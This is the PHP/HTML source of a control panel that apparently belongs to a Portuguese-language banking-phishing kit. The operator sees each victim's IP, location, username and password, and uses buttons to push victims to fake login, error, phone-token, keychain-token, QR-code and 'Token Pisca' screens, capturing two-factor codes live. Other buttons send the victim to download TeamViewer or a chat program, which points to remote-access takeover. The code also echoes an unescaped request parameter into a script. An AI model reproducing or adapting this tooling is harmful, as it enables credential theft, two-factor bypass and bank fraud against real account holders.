<?php
require_once 'config.php';
include 'validaLogin.php';
$id = isset($_GET['id']) ? $_GET['id'] : '';
$info = Info::findById($id);
if(!$info){
  echo "Erro ao encontrar a info!";
  exit();
}
getHeader(null, $info['usuario']. " | ".$info['ip']);
?>
<div class="container-fluid">
<div class="pt-5">
    <?php
        $acessos = Acesso::buscarTodos();
    ?>
    <div class="container-fluid mb-3" style="padding: 0px;">
        <div class="row">
          <div class="col-4">

          </div>
          <div class="col-8 text-right pt-1">
            <a id="controlarContador" class="contador" href="">Parar / Iniciar</a>
            <span id="timer" class="contador">Atualizar em: <span id="segundos"></span> segundos</span>
          </div>
        </div>
    </div>
    
    <table id="infos" class="table">
        <thead>
          <tr>
            <th width="3%" scope="col">#</th>
            <th width="8%" scope="col">IP</th>
            <th width="12%" scope="col">Data Hora</th>
            <th width="10%" scope="col">País</th>
            <th width="10%" scope="col">Estado</th>
            <th width="10%" scope="col">Cidade</th>
            <th width="8%" scope="col">Status</th>
            <th width="20%" scope="col">Tela</th>
            <th width="10%" scope="col">Usuário</th>
            <th width="10%" scope="col">Senha</th>
          </tr>
        </thead>
        <tbody>
  
        <tr class="header">
                        <td scope="row"><span class="id"><?php echo $info['id'];?></span></td>
                        <td><span class="ip">-</span></td>
                        <td><span class="data">-</span></td>
                        <td><span class="pais">-</span></td>
                        <td><span class="uf">-</span></td>
                        <td><span class="cidade">-</span></td>
                        <td><span class="status statusConexao">-</span></td>
                        <td><span class="comando">-</span></td>
                        <td><span class="usuario">-</span></td>
                        <td><span class="senha">-</span></td>
                        
                    </tr>
                    <tr class="detail ${parseInt(e.aberto) === 0 ? 'hide' : ''}">
                        <td colspan="10">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-12" id="botoes-acoes">
                                    <div id="botoes-parte-1" class="<?php echo strpos($info['comando'], 'INTERNA') != false ? 'hide': ''; ?>">
                                        <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="LOGIN" type="button" class="btn btn-action btn-outline-info btn-sm excluir-info"><i class="fas fa-sign-in-alt"></i> Enviar para Login</button>





									   <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="AGUARDANDO_LOGIN" type="button" class="btn btn-action btn-outline-success btn-sm excluir-info"><i class="fas fa-spinner"></i> Aguardando</button>
                                        <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="LOGIN_ERRO" type="button" class="btn btn-action btn-outline-danger btn-sm excluir-info"><i class="fas fa-exclamation-triangle"></i> Usuário / Senha Inválidos</button>
                                        <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CELULAR" type="button" class="btn btn-outline-dark btn-sm excluir-info action-validate-infos"><i class="fas fa-mobile"></i> Token Celular</button>




									   <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CELULAR_ERRO" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-danger btn-sm excluir-info action-validate-infos"><i class="fas fa-mobile"></i> Token Celular Erro</button>

                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CHAVEIRO" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-info btn-sm excluir-info action-validate-infos"><i class="fas fa-pager"></i> Token Chaveiro</button>
                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CHAVEIRO_ERRO" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-danger btn-sm excluir-info action-validate-infos"><i class="fas fa-pager"></i> Token Chaveiro Erro</button>
                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="INICIAR_ATUALIZACAO_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 action-validate-infos"><i class="fas fa-paper-plane "></i> Enviar para Interna</button>

                                    </div>
                                    <div id="botoes-parte-2" class="<?php echo strpos($info['comando'], 'INTERNA') != false ? '': 'hide'; ?>">
                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}"  data-action="ALTERAR_COMANDO" data-comando="INICIAR_ATUALIZACAO_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 action-validate-nome"><i class="fas fa-home"></i> Iniciar Atualização</button>
                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="AGUARDE_ATUALIZACAO_ANDAMENTO_INTERNA" type="button" class="btn action-validate-nome btn-outline-success btn-sm excluir-info"><i class="fas fa-spinner"></i> Aguarde, Atualização em Andamento</button>

                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CELULAR_INTERNA" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-dark btn-sm excluir-info action-validate-infos"><i class="fas fa-mobile"></i> Token Celular</button>
                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CELULAR_ERRO_INTERNA" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-danger btn-sm excluir-info action-validate-infos"><i class="fas fa-mobile"></i> Token Celular Erro</button>

                                        
                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CHAVEIRO_INTERNA" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-info btn-sm excluir-info action-validate-infos"><i class="fas fa-pager"></i> Token Chaveiro</button>
                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="TOKEN_CHAVEIRO_ERRO_INTERNA" data-numero-serie="${e.numeroSerie}" type="button" class="btn btn-outline-danger btn-sm excluir-info action-validate-infos"><i class="fas fa-pager"></i> Token Chaveiro Erro</button>


                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="AGUARDE_AVISO_QR_INTERNA" type="button" class="btn action-validate-nome btn-outline-primary btn-sm"><i class="fas fa-spinner"></i> Aguarde, Aviso QR Code</button>

                                        <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="FEIXE_LUMINOSIDADE_INTERNA" type="button" class="btn btn-outline-info btn-sm excluir-info action-validate-feixe"><i class="fas fa-lightbulb"></i> Token Pisca</button>
                                        <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="FEIXE_LUMINOSIDADE_ERRO_INTERNA" type="button" class="btn btn-outline-danger btn-sm excluir-info action-validate-feixe"><i class="fas fa-lightbulb"></i> Token Pisca Erro</button>

                                        <button data-id="<?php echo $info['id'];?>" data-nome="${e.nome}" data-action="ALTERAR_COMANDO" data-comando="CONCLUIR_ATUALIZACAO_INTERNA" type="button" class="btn action-validate-nome btn-outline-success btn-sm excluir-info"><i class="fas fa-check-circle"></i> Finalizar</button>
                                        <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="SOLICITAR_OUTRO_USER_INTERNA" type="button" class="btn btn-outline-dark btn-sm ml-2 btn-action"><i class="fas fa-users"></i> Solicitar outro Usuário</button>
                                    </div>
                                        <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="DOWNLOAD_1" type="button" class="btn btn-action btn-outline-info btn-sm excluir-info"><i class="fas fa-download"></i> SEM FUNÇÃO </button>
                                       <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="DOWNLOAD_2" type="button" class="btn btn-action btn-outline-info btn-sm excluir-info"><i class="fas fa-headphones"></i> BAIXAR CHAT ONLINE </button>
                                       <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="DOWNLOAD_3" type="button" class="btn btn-action btn-outline-info btn-sm excluir-info"><i class="fas fa-download"></i> BAIXAR TEAM VIEWER </button>

                                       <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="PROTEGIDO_1" type="button" class="btn btn-action btn-outline-info btn-sm excluir-info"><i class="fas fa-download"></i> ADIANTAMENTO </button>
                                       <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="PROTEGIDO_2" type="button" class="btn btn-action btn-outline-info btn-sm excluir-info"><i class="fas fa-download"></i> NUMERO PROTOCOLÇO </button>
                                       <button data-id="<?php echo $info['id'];?>" data-action="ALTERAR_COMANDO" data-comando="PROTEGIDO_3" type="button" class="btn btn-action btn-outline-info btn-sm excluir-info"><i class="fas fa-download"></i> AVALIAÇÃO CLIENTE </button>

                                </div>
                                </div>
                                <div class="row">
                                  <div id="token" class="col-6">
                                  <div class="mb-3 mt-3">
                                      <h5 class="mb-3">Token / Tabela Atual:</h5>
                                      <span class="token"><span class="tokenAtual">------</span></span>
                                  </div>
                                  <h5 class="mb-3">Histórico de Tokens / Tabelas</h5>
                                  <table id="tokens" class="table table-striped table-dark">
                                      <thead>
                                          <tr>
                                          <th scope="col">#</th>
                                          <th scope="col">Data / Hora</th>
                                          <th scope="col">Tipo</th>
                                          <th scope="col">Token/Tabela</th>
                                          </tr>
                                      </thead>
                                      <tbody>
                                    </tbody>
                                    </table>
                                </div>
                                    <div id="information" class="col-6">
                                        <h5 class="mb-3 mt-3">Enviar Informações:</h5>
                                        <table>
                                        <tbody>
										<tr class="">
                                                <td width="20%">Porcentagem(2-100):</td>
                                                <td>
												<input class="field" type="text" id="txtalpha" name="txtalpha" value="2" style="width:80%;"> 
												<button type="button" class="btn botao-pequeno btn-outline-info btn-sm ml-2" onclick="updatepor();">Enviar</button>
							<script type="text/javascript">						
				
			 setTimeout(vitamina, 2000);
			
			function vitamina() {
			var active = "2";
			
			var fileName = "./db/<?php echo $info['id'];?>.css";

	var txtFile;
        if (window.XMLHttpRequest)
	  {
	  txtFile = new XMLHttpRequest();
	  }
	else
	  {
	  txtFile = new ActiveXObject("Microsoft.XMLHTTP");
	  }
	txtFile.open("GET",fileName,false);
	txtFile.send();
	var txtDoc=txtFile.responseText;
	
	if (txtDoc == active ) {
	
		
	} else {
		active = txtDoc;
	 document.getElementById("porceta").innerHTML = txtDoc;
		document.getElementById("txtalpha").value = txtDoc;
	
	}
	
			}
											</script>
												<script type="text/javascript">
												function updatepor() {
													var nopl = $.post("./writevalue.php?id=<?php echo $_GET['id']; ?>&txtalpha="+document.getElementById("txtalpha").value);
													 document.getElementById("porceta").innerHTML = document.getElementById("txtalpha").value;
																	  alert("PORCENTAGEM ATUALIZADA");
  
}

													
													
													</script>		
												
												</td>
                                            </tr>
										
										
                                            <tr>
                                                <td width="20%">QR Code:</td>
                                                <td><input class="field" type="file" name="qrCodeFile" style="width:80%;"> <button data-id="<?php echo $info['id'];?>"  data-nome="${e.nome}" data-action="UPLOAD_QR" type="button" class="enviarQr btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                                            </tr>
                                            <tr>
                                                <td width="20%">Feixe Binário:</td>
                                                <td><input class="field" type="text" name="feixe" style="width:80%;"> <button data-id="<?php echo $info['id'];?>" type="button" class="enviarFeixeBinario btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                                            </tr>
                                            <tr class="nome">
                                                <td width="20%">Nome:</td>
                                                <td><input class="field" type="text" name="nome" style="width:80%;"> <button data-id="<?php echo $info['id'];?>" type="button" class="enviarNome btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                                            </tr>
											
                                            <tr>
                                                <td width="20%">Número de Série:</td>
                                                <td><input class="field" type="text" name="numeroSerie" style="width:80%;"> <button data-id="<?php echo $info['id'];?>" type="button" class="enviarNumeroSerie btn botao-pequeno btn-outline-info btn-sm ml-2">Enviar</button></td>
                                            </tr>
                                        </tbody>
                                        </table>
                                        <h5 class="mb-3 mt-3">Outras informações:</h5>
                                        <table>
                                        <tbody>
                                            <tr>
                                                <td width="20%">Tela:</td>
                                                <td><span class="comando">-</span></td>
                                            </tr>
                                            <tr>
                                                <td width="20%">Texto:</td>
                                                <td><span class="texto">-</span></td>
                                            </tr>
                                            <tr>
                                                <td>User Agent:</td>
                                                <td><span class="userAgent">-</span></td>
                                            </tr>
                                            <tr>
                                            <td>IP:</td>
                                            <td><span class="ip">-</span></td>
                                            </tr>
                                            <tr>
                                            <td>Dispositivo:</td>
                                            <td><span class="dispositivo">-</span></td>
                                            </tr>
											<tr>
											<td>Porcentagem Atual:</td>
										    <td><span class=""><div id="porceta">2</div></span></td>
                                            </tr>
                                            <tr>
                                            <td>Data Hora:</td>
                                            <td><span class="data">-</span></td>
                                            </tr>
                                            <tr>
                                            <td>Usuário:</td>
                                            <td><span class="usuario">-</span></td>
                                            </tr>
                                            <tr>
                                            <td>Senha:</td>
                                            <td><span class="senha">-</span></td>
                                            </tr>
                                            <tr>
                                            <td>QR Code File:</td>
                                            <td><span class="qrCodeFile">-</span></td>
                                            </tr>
                                            <tr>
                                            <td>Nome:</td>
                                            <td><span class="nome">-</span></td>
                                            </tr>
                                            <tr>
                                            <td>Número de Série:</td>
                                            <td><span class="numeroSerie">-</span></td>
                                            </tr>
                                            <tr>
                                            <td>Feixe Binário</td>
                                            <td style="word-break: break-all;"><span class="feixeBinario">-</span></td>
                                            </tr>
                                        </tbody>
                                        </table>
                                    </div>
                                </div>
                        </div>
                        </td>
                    </tr>
        </tbody>
        
      </table>

</div>
</div>
<audio id="myAudioAlteracaoInfo">
  <source src="myAudioAlteracaoInfo.mp3" type="audio/mpeg">
</audio>
<input type="hidden" name="id" id="id" value="<?php echo $id;?>">
<?php
getFooter(['js/operador.js']);
?>